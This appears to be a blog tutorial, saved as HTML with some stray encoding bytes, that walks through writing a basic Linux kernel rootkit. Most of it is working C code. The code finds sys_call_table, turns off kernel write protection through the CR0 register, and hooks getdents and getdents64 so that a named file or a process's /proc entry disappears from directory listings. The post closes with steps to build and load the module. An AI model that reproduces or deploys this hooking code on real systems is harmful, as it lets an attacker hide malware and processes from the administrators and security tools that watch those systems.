I"˚K<p>Rootkits are an advanced form of malware that leverage elevated privileges to hide themselves from the operating system. In this post we will go over how to write a basic rootkit that is capable of hiding files and processes on Linux.</p>

<h1 id="listing-files-in-a-directory">Listing files in a directory</h1>
<hr />

<p><br /></p>

<p>Let‚Äôs look at a simple C program that can list files in a directory.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;dirent.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">DIR</span> <span class="o">*</span><span class="n">d</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="s">"."</span><span class="p">);</span>
	<span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">dire</span><span class="p">;</span>
	<span class="k">while</span> <span class="p">((</span><span class="n">dire</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">d</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dire</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">closedir</span><span class="p">(</span><span class="n">d</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>We can see that the <code class="highlighter-rouge">readdir()</code> function is called to get the files in a folder, however we‚Äôre interested in going as low-level as possible to see what we need to hook in the kernel to manipulate the listed files for all programs. A good way of doing this is to use the <code class="highlighter-rouge">strace</code> tool to log all of the syscalls a program invokes.</p>

<p><code class="highlighter-rouge">strace ./a.out</code></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>munmap<span class="o">(</span>0x7fa11faa0000, 133984<span class="o">)</span>          <span class="o">=</span> 0
openat<span class="o">(</span>AT_FDCWD, <span class="s2">"."</span>, O_RDONLY|O_NONBLOCK|O_CLOEXEC|O_DIRECTORY<span class="o">)</span> <span class="o">=</span> 3
fstat<span class="o">(</span>3, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFDIR|S_ISVTX|0777, <span class="nv">st_size</span><span class="o">=</span>12288, ...<span class="o">})</span> <span class="o">=</span> 0
brk<span class="o">(</span>NULL<span class="o">)</span>                               <span class="o">=</span> 0x55ce40037000
brk<span class="o">(</span>0x55ce40058000<span class="o">)</span>                     <span class="o">=</span> 0x55ce40058000
getdents<span class="o">(</span>3, /<span class="k">*</span> 28 entries <span class="k">*</span>/, 32768<span class="o">)</span>    <span class="o">=</span> 1376
fstat<span class="o">(</span>1, <span class="o">{</span><span class="nv">st_mode</span><span class="o">=</span>S_IFCHR|0620, <span class="nv">st_rdev</span><span class="o">=</span>makedev<span class="o">(</span>136, 4<span class="o">)</span>, ...<span class="o">})</span> <span class="o">=</span> 0
write<span class="o">(</span>1, <span class="s2">".</span><span class="se">\n</span><span class="s2">"</span>, 2.<span class="o">)</span>                      <span class="o">=</span> 2
write<span class="o">(</span>1, <span class="s2">"..</span><span class="se">\n</span><span class="s2">"</span>, 3..<span class="o">)</span>                     <span class="o">=</span> 3
</code></pre></div></div>

<p>Several syscalls are invoked by our program and right before we start seeing some recognized files printed out (‚Äú.‚Äù, ‚Äú..‚Äù), <code class="highlighter-rouge">getdents()</code> is called. This is the syscall
that is used to get directory entries on Linux and therefore is what we want to hook to hide files.</p>

<h1 id="hooking-syscalls">Hooking Syscalls</h1>
<hr />

<p><br /></p>

<h2 id="syscall-table">Syscall Table</h2>
<p>In Linux, there is an <a href="https://elixir.bootlin.com/linux/v5.5.7/source/arch/x86/entry/syscall_64.c#L27">array in the kernel that contains pointers to all of the syscalls.</a></p>

<p><code class="highlighter-rouge">asmlinkage const sys_call_ptr_t sys_call_table[__NR_syscall_max+1]</code></p>

<p>The index into this array corresponds to the syscall number which you can <a href="https://syscalls.kernelgrok.com/">look up here</a>. Because of this, it is quite easy to hook a syscall function as we simply need to replace the function pointer for that syscall number to point to a function we define.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// Pointer to sys_call_table in memory</span>
<span class="k">static</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">syscall_table</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span><span class="mh">0xdeadbeef</span><span class="p">;</span>
<span class="n">syscall_table</span><span class="p">[</span><span class="n">__NR_getdents</span><span class="p">]</span> <span class="o">=</span> <span class="n">hooked_getdents</span><span class="p">;</span>
</code></pre></div></div>

<h2 id="modifying-syscall-table">Modifying Syscall Table</h2>

<p>Since the memory region of the kernel containing the <code class="highlighter-rouge">sys_call_table</code> pointer is marked read-only, we can‚Äôt modify it (even as ring 0) without first changing the permissions. To do this, we have to toggle the <a href="https://en.wikipedia.org/wiki/Control_register#CR0">WP bit (bit 16) in the CR0 register</a>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">write_cr0</span><span class="p">(</span><span class="n">read_cr0</span><span class="p">()</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span> <span class="mh">0x10000</span><span class="p">));</span> <span class="c1">//Enable write access</span>
<span class="n">write_cr0</span><span class="p">(</span><span class="n">read_cr0</span><span class="p">()</span> <span class="o">|</span> <span class="mh">0x10000</span><span class="p">);</span> <span class="c1">//Restore write protection</span>
</code></pre></div></div>

<h2 id="getting-the-address">Getting The Address</h2>

<p>Finally, we need to get the address of the <code class="highlighter-rouge">sys_call_table</code> array inside the kernel. There are numerous ways to do this, but we will use a simple one below.</p>

<p>The <code class="highlighter-rouge">/proc/kallsyms</code> file contains a mapping of kernel symbols to addresses and thankfully includes the <code class="highlighter-rouge">sys_call_table</code> symbol we are interested in. We can see that in our instance,
it is located at <code class="highlighter-rouge">0xffffffff9fe00240</code>.</p>

<p><strong>Note</strong>: this will change across systems and even reboots as the kernel memory map is randomized for security reasons.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:~<span class="nv">$ </span><span class="nb">sudo cat</span> /proc/kallsyms  | <span class="nb">grep </span>sys_call_table
ffffffff9fe00240 R sys_call_table
ffffffff9fe01600 R ia32_sys_call_table
</code></pre></div></div>

<p>Another, and perhaps easier way, is to use the <code class="highlighter-rouge">kallsyms_lookup_name()</code> function which returns a pointer to the symbol passed as a parameter. We can find the address of <code class="highlighter-rouge">sys_call_table</code> with the following code:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">table</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">kallsyms_lookup_name</span><span class="p">(</span><span class="s">"sys_call_table"</span><span class="p">);</span>
</code></pre></div></div>

<h2 id="putting-it-all-together">Putting it all together</h2>

<p>Combining the steps above, in order to hook a syscall the steps will be roughly as follows:</p>

<ol>
  <li>Get the address of the <code class="highlighter-rouge">sys_call_table</code> pointer</li>
  <li>Allow write access to kernel memory</li>
  <li>Hook syscall function</li>
  <li>Restore write protection to kernel memory</li>
</ol>

<h1 id="hiding-files">Hiding Files</h1>
<hr />

<p><br /></p>

<p>As we saw above, the <code class="highlighter-rouge">getdents()</code> and <code class="highlighter-rouge">getdents64()</code> syscalls are used to get the the files in a directory, so we will want to hook these to hide files.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">table</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="p">)</span> <span class="n">kallsyms_lookup_name</span><span class="p">(</span><span class="s">"sys_call_table"</span><span class="p">);</span> <span class="c1">//Lookup table entry point</span>
<span class="n">write_cr0</span><span class="p">(</span><span class="n">read_cr0</span><span class="p">()</span> <span class="o">&amp;</span> <span class="p">(</span><span class="o">~</span> <span class="mh">0x10000</span><span class="p">));</span> <span class="c1">//Enable write access</span>
<span class="n">original_getdents</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">table</span><span class="p">[</span><span class="n">__NR_getdents</span><span class="p">];</span>
<span class="n">original_getdents64</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">table</span><span class="p">[</span><span class="n">__NR_getdents64</span><span class="p">];</span>

<span class="n">table</span><span class="p">[</span><span class="n">__NR_getdents</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">my_getdents</span><span class="p">;</span> <span class="c1">//Hook getdents with our function</span>
<span class="n">table</span><span class="p">[</span><span class="n">__NR_getdents64</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">my_getdents64</span><span class="p">;</span>
<span class="n">write_cr0</span><span class="p">(</span><span class="n">read_cr0</span><span class="p">()</span> <span class="o">|</span> <span class="mh">0x10000</span><span class="p">);</span> <span class="c1">//Restore write protection</span>
</code></pre></div></div>

<p>Now we will define our own function that implements <code class="highlighter-rouge">getdents()</code> and hides the file <code class="highlighter-rouge">secret.txt</code> by removing it from the list of files.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">asmlinkage</span> <span class="kt">int</span> <span class="nf">my_getdents</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">linux_dirent</span><span class="o">*</span> <span class="n">dirp</span><span class="p">,</span> 
	<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">count</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">linux_dirent</span><span class="o">*</span> <span class="n">cur</span> <span class="o">=</span> <span class="n">dirp</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">pos</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

  <span class="c1">// Call original getdents</span>
  <span class="n">ret</span> <span class="o">=</span> <span class="n">original_getdents</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">dirp</span><span class="p">,</span> <span class="n">count</span><span class="p">);</span> 
  <span class="k">while</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&lt;</span> <span class="n">ret</span><span class="p">)</span> <span class="p">{</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">is_prefix</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">"secret.txt"</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// Insert your check here</span>
      <span class="c1">// Remove hidden file from list</span>
      <span class="kt">int</span> <span class="n">reclen</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">;</span>
      <span class="kt">char</span><span class="o">*</span> <span class="n">next_rec</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cur</span> <span class="o">+</span> <span class="n">reclen</span><span class="p">;</span>
      <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">dirp</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">next_rec</span><span class="p">;</span>
      <span class="n">memmove</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="n">next_rec</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
      <span class="n">ret</span> <span class="o">-=</span> <span class="n">reclen</span><span class="p">;</span>
      <span class="k">continue</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">pos</span> <span class="o">+=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">;</span>
    <span class="n">cur</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent</span><span class="o">*</span><span class="p">)</span> <span class="p">((</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">dirp</span> <span class="o">+</span> <span class="n">pos</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<h1 id="hiding-processes">Hiding Processes</h1>
<hr />

<p><br /></p>

<p>On Linux, process information is stored in the <code class="highlighter-rouge">/proc/{pid}</code> folder and tools like <code class="highlighter-rouge">ps</code> read these entries to report on what processes are running. Since we already know how to hide files, all we need to do is hide the file that is the entry inside the <code class="highlighter-rouge">/proc</code> folder and it will not show up when <code class="highlighter-rouge">ps</code> is called!</p>

<p>The quickest way to do this is substitute the filename check from above with the PID:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="p">(</span><span class="n">is_prefix</span><span class="p">(</span><span class="n">cur</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">"5048"</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// Insert your PID here</span>
      <span class="c1">// Remove hidden file from list</span>
      <span class="kt">int</span> <span class="n">reclen</span> <span class="o">=</span> <span class="n">cur</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">;</span>
      <span class="kt">char</span><span class="o">*</span> <span class="n">next_rec</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">cur</span> <span class="o">+</span> <span class="n">reclen</span><span class="p">;</span>
      <span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">dirp</span> <span class="o">+</span> <span class="n">ret</span> <span class="o">-</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">next_rec</span><span class="p">;</span>
      <span class="n">memmove</span><span class="p">(</span><span class="n">cur</span><span class="p">,</span> <span class="n">next_rec</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
      <span class="n">ret</span> <span class="o">-=</span> <span class="n">reclen</span><span class="p">;</span>
      <span class="k">continue</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>However this might hide some other files unintentionally, so it might be wise to check the full path.</p>
<h1 id="demo">Demo</h1>
<hr />

<p><br /></p>

<p>Try it yourself!</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant init gfoudree/rootkit-dev <span class="nt">--box-version</span> 1
vagrant up
vagrant ssh
</code></pre></div></div>

<p>Now build and install the kernel module:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>make
<span class="nb">sudo </span>insmod file_hider.ko
</code></pre></div></div>

<p>You should now notice that <code class="highlighter-rouge">secret.txt</code> is missing from the files in the current directory. Remove the kernel module <code class="highlighter-rouge">sudo rmmod file_hider</code> and observe that it appears again.</p>
:ET